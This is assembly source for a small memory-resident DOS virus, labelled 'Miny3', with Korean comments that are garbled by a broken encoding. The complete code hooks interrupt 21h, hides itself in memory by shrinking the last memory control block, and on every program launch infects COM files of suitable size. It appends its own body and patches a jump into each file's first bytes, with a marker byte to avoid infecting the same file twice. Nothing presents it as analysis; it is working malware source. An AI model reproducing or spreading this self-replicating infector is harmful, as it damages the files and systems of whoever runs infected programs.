;******************************************************************************
;*        MINY3.256 �a����a ���a                                             *
;*                                                                            *
;*                                                                            *
;*     ����3 �����a���A �a�a�� ���e �a����a���A �a�w �����a �l�e���a�� �i�a  *
;*   �a ���a. COM �e�q�q�A�e ���w�� �a����a���a.                             *
;*                                                                            *
;*                                                                            *
;*                                                                            *
;******************************************************************************


 PARASIZE      EQU     (TVirEND - Start + 0Fh) SHR 4 ; ���A�� �a���a�e �a��

 VIRUS         SEGMENT PARA 'VIRUS'
               ASSUME CS:VIRUS, DS:VIRUS

 Start:
               call    Next                       ; �a����a �w����˥�a�� ���a

;**************************************************
;    ������ 21h �� ������a
;**************************************************

 NewInt21:
               xchg   ah,al                       ; AH,AL �t �a����
               cmp    al,4Bh                      ; ��З���a?
               jnz    J_Int21

               cmp    ah,30h                      ; �� �w�� �a�� ��a���a?
               jnz    Push_All
               xor    ax,ax                       ; �x�a�e 0000�i ���a��
               IRET

 Push_All:                                        ; �A���a�� ��w
               Pushf
               Push    ax
               Push    bx
               Push    cx
               Push    dx
               Push    ds
               Push    si

               mov     ax,3D02h                   ; �a�� ���e �a��
               Int     21h
               jc      Pop_All                    ; �A��e �{����

               push    cs                         ; CS=DS
               pop     ds
               xchg    bx,ax                      ; BX=�a�� Ѕ�i

 Read_File:
               mov     ah,3Fh                     ; ���� �i����
               mov     dx,offset Org4bytes        ; 4 �a���a
               mov     si,dx                      ; SI=���e ����
               mov     cx,0004h                   ; ����
               int     21h

 ChkFileisEXE:
               cmp     byte ptr [SI],'M'          ; EXE �a�� ���a?
               jz      Close_File                 ; EXE �e �a�� �i���a

 Infect_COM:
               cmp     byte ptr [SI+3],43h        ; �q�q�a�� ��a
               jz      Close_File                 ; (V3�� �w�� ���t�i �a���a��
                                                  ; �q�q�e�Q)
               mov     al,02h                     ; �a���� �A�� �ᝡ
               call    Set_Pnt

               cmp     ax,1234                    ; 1234 ���a �b�e�a?
               jb      Close_File
               cmp     ax,65000                   ; 65000 ���a �e�a?
               ja      Close_File

               sub     ax,0003                    ; �a�� ����-3 = ���a�i ��á
               mov     word ptr Filehead+1,ax
               mov     byte ptr Filehead+3,43h    ; �q�q�a�� ���a�i

               mov     ah,40h                     ; �a����a �a��
               mov     cx, offset VirEND          ; ���� (256 �a���a)
               xor     dx,dx                      ; ����
               Int     21h

               mov     al,00h                     ; �a���� ��q�a�� ����
               call    Set_Pnt

               mov     ah,40h                     ; �a����a �a��
               mov     dx, offset FileHead        ; (�|�����A Ё�w)
               mov     cx,0004h                   ; Jump �w�w�a�� ͡�qЁ�� 4�a��
               Int     21h                        ; �a

 Close_File:                                      ; �a�� �h��
               mov     ah,3eh                     ; ����,�i�a�w�e �q�q�I�� �a��
               Int     21h                        ; �a.

 Pop_All:                                         ; �A���a�� ����
               Pop     si
               Pop     ds
               Pop     dx
               Pop     cx
               Pop     bx
               Pop     ax
               Popf
 J_Int21:                                         ; ���� int 21�� ���a
               xchg    ah,al
               DB      0EAh                       ; JMP �w�w
 OldInt21      DD      ?

;*************************************************
; �a����a �� �w�� �a�a
;*************************************************
 Next:         pop     BP                         ; BP�A CALL �� ѡ�E �a�q�t
               sub     bp, +03                    ; -3 �a�e �a����a ���b��

               mov     AX,304Bh                   ; �� �w�� �a�� ��a
               xchg    ah,al                      ; AX=4B30
               Int     21h                        ;
               or      ax,ax                      ; AX �t�� 0000���e ���A �a����a�a ����
               jz      Restart_COM                ; ���� ���A �a����a�a ���i �w��

               mov     ah,0F0h                    ; ��ϩ�a
               mov     ch,'S'                     ; ��ϩ�a

               MOV     BX,ES                      ; MCB ���a��
               NOP
               DEC     BX                         ; -1 : Memory Control Block
               mov     ds,bx
               NOP
               xor     bx,bx                      ; BX=0000
               Inc     bl                         ; BL=01
               cmp     byte ptr [BX-1],'Z'        ; �a���b �i�ⷥ�a?
               jnz     Restart_COM                ; �a���e �� �w�� �e�q
               NOP
               mov     AX, PARASIZE               ; ���� �� �a��
               sub     word ptr [BX+02],AX        ; �i�� �a���a(BX=0003)
               NOP

               sub     word ptr [BX+11h],AX       ; �a�q �A���� �i�ⷁ �A�a���a �廡
               mov     cl,'V'                     ; BX=0012 (mov cl,'V'�e ��ϩ�a�q)
               mov     es,word ptr [BX+11h]       ; ���� ����

                                                  ; Int 21h �a������
               xor     ax,ax                      ; DS=0000
               mov     ds,ax
               lds     AX, [BX+83h]               ; DI=0084h
               mov     word ptr ss:[BP+OldInt21+2],DS
               mov     word ptr ss:[BP+OldInt21],AX

               push    cs                         ; �a����a�i �A�w�ᝡ ���a�e�a.
               pop     ds
               mov     si,BP                      ; SI=�a����a ���b��
               xor     di,di
               mov     cx,offset TVirEND          ; ��������
               cld
               repz    movsb                      ; ���a

               mov     ds,cx                      ; Int 21h �i �a���e�a.
               cli
               mov     word ptr [BX+85h],es       ;
               mov     word ptr [BX+83h],offset NewInt21
               sti

 Restart_COM:
               mov     si,BP                      ; SI = ���b��

               push    cs
               pop     ds
               push    cs                         ; ds=es
               pop     es

                                                  ; ���� �a���a�� ��З�a��
               add     si,offset Org4bytes        ; ���� �w�w��a ��w�E ����
               mov     di,0100h                   ; ��q�� 4 �a���a ����
               push    di
               movsw                              ; ���a
               movsw
               RET                                ; ����З

               NOP
 Org4bytes     db      90h,90h,0cdh,20h           ; ���� 4 �a���a�� �t

 Set_Pnt:                                         ; ��á ���� �w�w
               mov     ah,42h
               xor     cx,cx
               xor     dx,dx
               Int     21h
               RET

               DB     'Miny3'                     ; �a����a ���q
 FileHead      DB     0E9h                        ; JMP �w�w
                                                  ; �a������ �a���A�e �e�a�a��
 VirEND:                                          ; �q�q�I �a�� �|�����A �a��
               DB     ?,?,?                       ; �w�w
 TVirEND:                                         ; ���A�� �����a�e ����

 VIRUS         ENDS
               end    start
